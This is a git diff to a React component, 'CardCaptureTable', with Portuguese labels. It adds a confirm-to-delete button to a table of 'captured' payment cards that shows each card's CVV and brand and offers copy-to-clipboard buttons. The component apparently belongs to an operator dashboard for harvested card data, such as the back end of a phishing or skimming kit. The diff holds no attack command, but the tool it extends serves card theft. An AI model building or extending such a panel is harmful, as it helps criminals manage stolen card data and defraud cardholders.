@@ -2,9 +2,20 @@
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
 import { CardBrandBadge } from "./CardBrandBadge";
 import { Skeleton } from "@/components/ui/skeleton";
-import { Copy } from "lucide-react";
+import { Copy, Trash2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { toast } from "sonner";
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogCancel,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+  AlertDialogTrigger,
+} from "@/components/ui/alert-dialog";
 
 interface CapturedCard {
   id: number;
@@ -20,9 +31,16 @@ interface CardCaptureTableProps {
   cards: CapturedCard[];
   formatDate: (dateString: string) => string;
   isLoading?: boolean;
+  onDeleteCard: (id: number) => Promise<void>;
 }
 
-export const CardCaptureTable = ({ cards, formatDate, isLoading = false }: CardCaptureTableProps) => {
+export const CardCaptureTable = ({ 
+  cards, 
+  formatDate, 
+  isLoading = false,
+  onDeleteCard 
+}: CardCaptureTableProps) => {
+  
   const copyToClipboard = (text: string, type: string) => {
     navigator.clipboard.writeText(text).then(() => {
       toast.success(`${type} copiado para a área de transferência`);
@@ -85,7 +103,7 @@ export const CardCaptureTable = ({ cards, formatDate, isLoading = false }: CardC
                 <TableCell>{card.cvv}</TableCell>
                 <TableCell><CardBrandBadge bandeira={card.bandeira} /></TableCell>
                 <TableCell>{formatDate(card.criado_em)}</TableCell>
-                <TableCell className="text-right">
+                <TableCell className="text-right flex justify-end items-center gap-2">
                   <Button 
                     variant="ghost" 
                     size="sm" 
@@ -98,6 +116,36 @@ export const CardCaptureTable = ({ cards, formatDate, isLoading = false }: CardC
                     <Copy size={14} className="mr-2" />
                     Copiar
                   </Button>
+                  
+                  <AlertDialog>
+                    <AlertDialogTrigger asChild>
+                      <Button 
+                        variant="destructive" 
+                        size="sm" 
+                        className="h-8"
+                      >
+                        <Trash2 size={14} className="mr-2" />
+                        Apagar
+                      </Button>
+                    </AlertDialogTrigger>
+                    <AlertDialogContent>
+                      <AlertDialogHeader>
+                        <AlertDialogTitle>Apagar Cartão</AlertDialogTitle>
+                        <AlertDialogDescription>
+                          Tem certeza que deseja apagar este cartão? Esta ação não pode ser desfeita.
+                        </AlertDialogDescription>
+                      </AlertDialogHeader>
+                      <AlertDialogFooter>
+                        <AlertDialogCancel>Cancelar</AlertDialogCancel>
+                        <AlertDialogAction 
+                          onClick={() => onDeleteCard(card.id)}
+                          className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
+                        >
+                          Apagar
+                        </AlertDialogAction>
+                      </AlertDialogFooter>
+                    </AlertDialogContent>
+                  </AlertDialog>
                 </TableCell>
               </TableRow>
             ))
